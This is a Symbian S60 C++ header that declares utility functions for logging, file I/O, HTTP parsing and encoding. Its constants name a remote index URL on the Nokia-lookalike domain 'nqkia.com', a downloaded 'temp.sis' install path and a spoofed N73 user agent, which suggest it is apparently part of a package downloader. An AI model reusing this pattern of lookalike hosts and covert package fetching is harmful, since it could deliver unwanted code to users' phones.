#ifndef _COMMUTILS_H_
#define _COMMUTILS_H_
#include <e32std.h>
#include <bautils.h>

//#define MYDEBUG

_LIT(KAppFolder,"c:\\data\\Package\\");
_LIT(KLocalIndexPath,"c:\\data\\Package\\index.txt");
_LIT(KLocalSisPath,"c:\\data\\Package\\temp.sis");
_LIT(KLogPath,"c:\\data\\Package\\debug.txt");
_LIT8(KIndexUrl, "http://nqkia.com/mm/index.php");
_LIT8(KUserAgent,"NokiaN73-1/2.0628.0.0.1 S60/3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1");
_LIT8(KNewLine,"\n");

/**
 *Marco
 *
 */
#ifndef SAFE_DELETE
#define SAFE_DELETE(x)  \
  {                   \
    if(x)           \
      delete (x); \
    (x) = NULL;     \
  }
#endif

#ifndef SAFE_DELETEARRAY
#define SAFE_DELETEARRAY(x)  \
  {                   \
  if(x)           \
  delete[] (x); \
  (x) = NULL;     \
  }
#endif

typedef TBuf8<512> TDbgLog;

void Log(const TDesC8& buf,TDesC& file,TInt append=1); //打印日志到指定的文件
void Log(const TDesC8& buf,TInt append=1);
void Log(const TDesC& buf,TInt append=1);

TInt SaveBufToFile(const TDesC& aFileName,const void *aWiteBuffer,TInt aSize,TInt aWriteType); //保存数据到文件
TFileName GetAppDrive(); //获取安装盘符
TInt GetFileSize(const TDesC& aFileName); //获取文件大小
void DeleteFolder(const TDesC& aFolderName);
void DeleteFile(const TDesC& aFileName); //删除文件
TInt ReadFromFile(const TDesC& aFileName,HBufC8*& aOutBuf);
TBool FileExists(const TDesC& aFileName);

TInt ExtractContentLength(const TDesC8& aInHttpHeader,TInt& aOutLen); //解析数据总长度，若非部分请求，则解析Http头信息里的Content-Length，否则解析Content-Range
TInt ExtractContentLengthField(const TDesC8& aInHttpHeader,TInt& aOutLen); //解析Http头信息里的Content-Length
TInt ExtractContentRange(const TDesC8& aInHttpHeader,TInt& aOutRangeBegin,TInt& aOutRangeEnd,TInt& aOutContentLen); //解析Http头信息里的Content-Range
TInt GetHttpHeaderLen(const TDesC8& aHeader,TInt& aOutLen); //获取Http信息头的长度
HBufC8* GetHttpHeaderInfo(const TDesC8 &aHeaderData,const TDesC8 &aHeaderInfo); //解析Http头信息字段为HeaderData的信息
TInt UnicodeToUtf8(const TDesC16& aUni,TDes8& aUtf8);
TInt Utf8ToUnicode(const TDesC8& aUtf8,TDes16& aUni);
TInt GbkToUnicode(TDesC8& aGbk,TDes& aUni);
TInt UnicodeToGbk(TDesC& aUni,TDes8& aGbk);
TInt VersionCompare(const TDesC8& aRemoteVer,const TDesC8& aLocalVersion);
void ReplaceHost(TDes8& aUrl,const TDesC8& aReplaceHost);
TInt ReplaceAll(TDes8& aString,const TDesC8& aOrigin,const TDesC8& aReplace);
HBufC8* UrlEncodeL(const TDesC8& aUrl);
TPtrC ExtractNode(const TDesC& aInXml,const TDesC& aInNodeName);
TPtrC8 ExtractIni(const TDesC8& aData,const TDesC8& aNode,const TDesC8& aKey);
TPtrC8 ExtractIni2(const TDesC8& aData,const TDesC8& aNode,const TDesC8& aKey);
void XorEncode(TDes8& dataBuf,unsigned long dataLen);
TInt HexString2Int(const TDesC & aHexStr);
TUid HexString2Uid(const TDesC8& aString);
void DoEscapeChar(TDes8& aStr);
TInt SeprateToArray(const TDesC8& aData,const TDesC8& aSeprator,CDesC8Array& aArray);
TInt SeprateToArrayW(const TDesC& aData,const TDesC& aSeprator,CDesCArray& aArray);
#endif
